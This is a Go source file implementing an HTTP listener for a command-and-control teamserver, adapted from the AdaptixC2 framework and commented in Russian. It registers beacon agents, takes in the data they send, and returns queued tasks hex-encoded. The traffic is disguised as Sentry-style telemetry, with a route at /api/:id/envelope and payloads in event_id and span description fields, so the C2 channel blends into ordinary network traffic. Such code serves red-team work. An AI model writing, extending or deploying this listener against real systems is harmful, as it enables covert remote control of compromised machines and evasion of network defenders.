package main

// This file is simplified and a bit reworked version of https://github.com/Adaptix-Framework/AdaptixC2/blob/main/Extenders/beacon_listener_http/pl_http.go

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

type HTTPConfig struct {
	HostBind        string `json:"host_bind"`
	PortBind        int    `json:"port_bind"`
	CallbackAddress string `json:"callback_address"`
}

type HTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    HTTPConfig
	Name      string
	Active    bool
}

func (handler *HTTP) Start(ts Teamserver) error {
	var err error = nil

	// Настраиваем Gin
	gin.SetMode(gin.ReleaseMode)
	router := gin.New()

	// Привязываем наш обработчик запросов к пути
	router.POST("/api/:id/envelope", handler.processRequest)

	// Инициализируем статус листенера
	handler.Active = true

	// Создаём HTTP сервер
	handler.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind),
		Handler: router,
	}

	fmt.Printf("   Started listener: http://%s:%d\n", handler.Config.HostBind, handler.Config.PortBind)

	// В отдельной горутине запускаем наш HTTP-сервер
	go func() {
		err = handler.Server.ListenAndServe()
		if err != nil && !errors.Is(err, http.ErrServerClosed) {
			fmt.Printf("Error starting HTTP server: %v\n", err)
			return
		}
		handler.Active = true
	}()

	// Немного ждём, чтобы сервер успел подняться
	time.Sleep(500 * time.Millisecond)
	return err
}

func (handler *HTTP) Stop() error {
	var (
		ctx    context.Context
		cancel context.CancelFunc
		err    error = nil
	)

	ctx, cancel = context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	err = handler.Server.Shutdown(ctx)
	return err
}

func (handler *HTTP) processRequest(ctx *gin.Context) {
	var (
		ExternalIP   string
		err          error
		agentType    string
		agentId      string
		beat         []byte
		bodyData     []byte
		responseData []byte
	)

	// Получаем IP подключенного агента
	ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]

	// Парсим данные переданные агентом
	agentType, agentId, beat, bodyData, err = handler.parseBeatAndData(ctx)
	if err != nil {
		goto ERR
	}

	if !ModuleObject.ts.TsAgentIsExists(agentId) {
		_, err = ModuleObject.ts.TsAgentCreate(agentType, agentId, beat, handler.Name, ExternalIP, true)
		if err != nil {
			goto ERR
		}
	}

	_ = ModuleObject.ts.TsAgentSetTick(agentId)

	_ = ModuleObject.ts.TsAgentProcessData(agentId, bodyData)

	responseData, err = ModuleObject.ts.TsAgentGetHostedAll(agentId, 0x1900000) // 25 Mb

	if err != nil {
		goto ERR
	} else {
		hexEncodedResponseData := hex.EncodeToString(responseData)
		response := `{"id": "` + hexEncodedResponseData + `"}`
		// Формируем ответ от сервера
		ctx.Writer.Header().Add("Content-Type", "application/json")
		_, err = ctx.Writer.Write([]byte(response))
		if err != nil {
			// Если произошла ошибка, откидываем 404
			fmt.Println("Failed to write to request: " + err.Error())
			ctx.Writer.WriteHeader(http.StatusNotFound)
			return
		}
	}

	ctx.AbortWithStatus(http.StatusOK)
	return

ERR:
	// Если произошла ошибка, откидываем 404
	fmt.Println("Error: " + err.Error()) // Оставим временно для отладки
	ctx.Writer.WriteHeader(http.StatusNotFound)
}

type BeatLine struct {
	EventId string `json:"event_id"`
}

type DataLine struct {
	Spans []struct {
		Description string `json:"description"`
	} `json:"spans"`
}

func (handler *HTTP) parseBeatAndData(ctx *gin.Context) (string, string, []byte, []byte, error) {
	var (
		agentType uint
		agentId   uint
		agentInfo []byte
		bodyData  []byte
		err       error
		firstLine []byte
		thirdLine []byte
		agentData []byte
	)

	bodyData, err = io.ReadAll(ctx.Request.Body)
	if err != nil {
		return "", "", nil, nil, errors.New("missing POST data")
	}

	lines := bytes.Split(bodyData, []byte{'\n'})
	if len(lines) < 3 {
		return "", "", nil, nil, errors.New("missing data - less than 3 lines")
	}
	firstLine = lines[0]
	thirdLine = lines[2]

	// Parse beat (first line of json -> event_id)
	var beatLine BeatLine

	err = json.Unmarshal(firstLine, &beatLine)
	if err != nil {
		return "", "", nil, nil, errors.New("failed decode beat")
	}

	agentInfoEncoded := beatLine.EventId

	agentInfo, err = hex.DecodeString(agentInfoEncoded)
	if err != nil {
		return "", "", nil, nil, errors.New("failed decode beat")
	}

	agentType = uint(binary.LittleEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]
	agentId = uint(binary.LittleEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]

	// Parse beat (first line of json -> event_id)
	var dataLine DataLine

	err = json.Unmarshal(thirdLine, &dataLine)
	if err != nil {

		return "", "", nil, nil, errors.New("failed decode data")
	}

	if len(dataLine.Spans) == 0 {
		return "", "", nil, nil, errors.New("failed decode data - no spans")
	}

	agentDataEncoded := dataLine.Spans[0].Description
	agentData, err = hex.DecodeString(agentDataEncoded)
	if err != nil {
		return "", "", nil, nil, errors.New("failed decode data")
	}

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), agentInfo, agentData, nil
}
